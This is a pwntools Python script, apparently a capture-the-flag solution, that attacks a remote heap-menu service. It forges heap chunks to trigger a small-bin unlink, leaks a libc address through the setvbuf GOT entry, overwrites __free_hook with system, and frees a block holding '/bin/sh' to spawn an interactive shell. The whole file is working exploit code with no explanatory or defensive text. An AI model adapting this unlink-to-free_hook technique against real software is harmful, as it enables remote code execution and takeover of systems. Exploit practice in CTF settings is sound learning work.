###Heap small bin unlink exploit###

from pwn import *

context.arch = 'amd64'

###Utils
def new(sz):
    r.sendlineafter(':','1')
    ID = r.recvuntil('\n').strip()
    ID = ID.split(b' ')[1].decode('utf-8')
    r.sendlineafter('size:',str(sz))
    return ID

def edt(idx,sz,data):
    r.sendlineafter(':','2')
    r.sendlineafter('id:',idx)
    r.sendlineafter('size:',str(sz))
    r.sendafter('text:',data)

def rmv(idx):
    r.sendlineafter(':','3')
    r.sendlineafter('id:',idx)

def prnt(idx):
    r.sendlineafter(':','4')
    r.sendlineafter('id:',idx)
    return r.recvline()[1:-1]


r = remote('chall2.ctfs.me',2012)

###Useful Address
ptr2block1 = 0x602028
ptr2block4 = 0x602058
setvbuf_got = 0x601fc0
setvbuf_offset = 0x6fe70
system_offset = 0x45390
free_hook_offset = 0x3c67a8

###Prepare blocks
ID1 = new(0x98)
ID2 = new(0x98)
ID3 = new(0x98)
ID4 = new(0x98)
ID5 = new(0x98)
ID6 = new(0x98)

###Leak libc_base
edt(ID1,0x100,(p64(0)+p64(0x91)+p64(ptr2block1-0x18)+p64(ptr2block1-0x10)).ljust(0x90,b'\x00')+p64(0x90)+p64(0xa0))
rmv(ID2)
edt(ID1,0x100,b'\x00'*16+p64(int(ID1,16))+p64(setvbuf_got))
setvbuf_addr = u64(prnt(ID1).ljust(8,b'\x00'))
libc_base = setvbuf_addr-setvbuf_offset

###Modify free_hook
edt(ID4,0x100,(p64(0)+p64(0x91)+p64(ptr2block4-0x18)+p64(ptr2block4-0x10)).ljust(0x90,b'\x00')+p64(0x90)+p64(0xa0))
rmv(ID5)
edt(ID4,0x100,b'\x00'*16+p64(int(ID4,16))+p64(libc_base+free_hook_offset))
edt(ID4,0x100,p64(libc_base+system_offset))

###Write system argument
edt(ID6,0x100,b'/bin/sh\x00')

###Call system
rmv(ID6)

r.interactive()
